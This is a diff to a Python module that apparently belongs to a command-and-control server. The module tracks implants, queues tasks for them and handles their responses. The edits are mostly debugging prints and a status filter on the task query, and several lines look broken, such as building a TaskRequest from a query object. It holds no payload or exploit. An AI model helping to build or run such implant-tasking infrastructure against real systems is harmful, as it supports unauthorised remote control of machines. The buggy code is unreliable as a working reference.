@@ -3,7 +3,7 @@ from cvnt.tables import *
 from cvnt.database import db
 from cvnt.implant_pb2 import *
 from ip2geotools.databases.noncommercial import DbIpCity# type: ignore
-
+from sqlalchemy.sql.functions import func
 # Task Statuses
 STATUS_CREATED  = "implant task created"
 STATUS_TASK_RECIEVED = "implant pulled down task"
@@ -33,7 +33,7 @@ def register_implant(i):
 def update_implant_last_seen(iID):
     # Query the Implant table by implant_id
     implant = get_implant_by_id(iID)
-    print(f"\n\n\n ---- THIS IS THE IMP:ANT ---- \n\n {implant}\n\n --- END OF IMPLANT ---\n")
+    # print(f"\n\n\n ---- THIS IS THE IMP:ANT ---- \n\n {implant}\n\n --- END OF IMPLANT ---\n")
     implant.last_seen = func.now()
     db.session.commit()
     return implant
@@ -73,6 +73,7 @@ def get_task_by_ids(task_id, implant_id):
     return implant
 
 def analyze_TaskResponse(tr: TaskResponse):
+
     if tr.ByteSize() == 0:
         return False
     
@@ -84,9 +85,7 @@ def analyze_TaskResponse(tr: TaskResponse):
     # Query the Implant table by implant_id
     task = get_task_by_ids(tr.TaskID, tr.ImplantID)
 
-    if not task.isinstance(Task):
-        print(f'WOMP WOMP')
-        return False
+    print(f"TASK FOUND: {task}")
 
     if not tr.HasField("Response"):
         task.status = STATUS_TASK_FAILED
@@ -102,7 +101,17 @@ def analyze_TaskResponse(tr: TaskResponse):
 
 # Send TaskRequest back or "" (if no tasks)
 def get_next_task(iID):
-   task = db.session.query(Task).filter_by(implant_id=iID).order_by(Task.task_id.desc())
+   print(f"GET TASK TABLE{db.session.query(Task)}")
+   print(db.session.query(Task).filter_by(implant_id=iID))
+   print(db.session.query(Task).filter_by(implant_id=iID).filter_by(status=STATUS_CREATED))
+   print(db.session.query(Task).filter_by(implant_id=iID).filter_by(status=STATUS_CREATED).order_by(Task.task_id.desc()))
+   print(db.session.query(Task).filter_by(implant_id=iID).filter_by(status=STATUS_CREATED).order_by(Task.task_id.desc()))
+   task = db.session.query(Task).filter_by(implant_id=iID).filter_by(status=STATUS_CREATED).order_by(Task.task_id.desc())
+   print(task)
+   # taskID, opcode, args
+   tr = TaskRequest(task.task_id, task.task_opcode, task.args)
+
+   print(task)
    return task
 
 def make_dummy_task(ip):
